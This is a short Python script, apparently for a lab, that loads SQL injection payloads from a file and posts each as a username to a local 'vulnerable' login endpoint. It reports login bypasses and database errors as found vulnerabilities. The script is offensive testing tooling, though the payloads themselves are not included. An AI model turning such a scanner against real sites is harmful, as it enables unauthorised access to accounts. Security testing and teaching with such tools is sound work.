import requests
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

# Configuration
TARGET_URL = "http://127.0.0.1:5000/vulnerable"
PAYLOADS_FILE = "payloads.txt"

def run_scanner():
    print(Fore.CYAN + f"[*] SQLi Hunter initialized against: {TARGET_URL}")
    print(Fore.CYAN + f"[*] Loading payloads from {PAYLOADS_FILE}...")
    
    try:
        with open(PAYLOADS_FILE, 'r') as f:
            payloads = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "[-] Error: payloads.txt not found.")
        return

    print(f"[*] Loaded {len(payloads)} payloads. Starting attack...\n")

    for payload in payloads:
        data = { "username": payload, "password": "password123" }
        
        try:
            # We send the payload to the web app
            res = requests.post(TARGET_URL, data=data)
            response_json = res.json()
            
            # Analyze the JSON response
            is_success = response_json.get("success", False)
            message = response_json.get("message", "")

            if is_success:
                print(Fore.GREEN + f"[+] VULNERABILITY FOUND!")
                print(f"    Payload: {payload}")
                print(f"    Logged in as: {response_json.get('user')}")
                print("-" * 40)
            elif "Syntax Error" in message:
                print(Fore.YELLOW + f"[!] Database Error Triggered (Potential Blind SQLi)")
                print(f"    Payload: {payload}")
                print(f"    Error: {message}")
                print("-" * 40)
            else:
                print(Fore.RED + f"[-] Failed: {payload}")

        except Exception as e:
            print(Fore.RED + f"[-] Connection Error: {e}")
            break

if __name__ == "__main__":
    run_scanner()
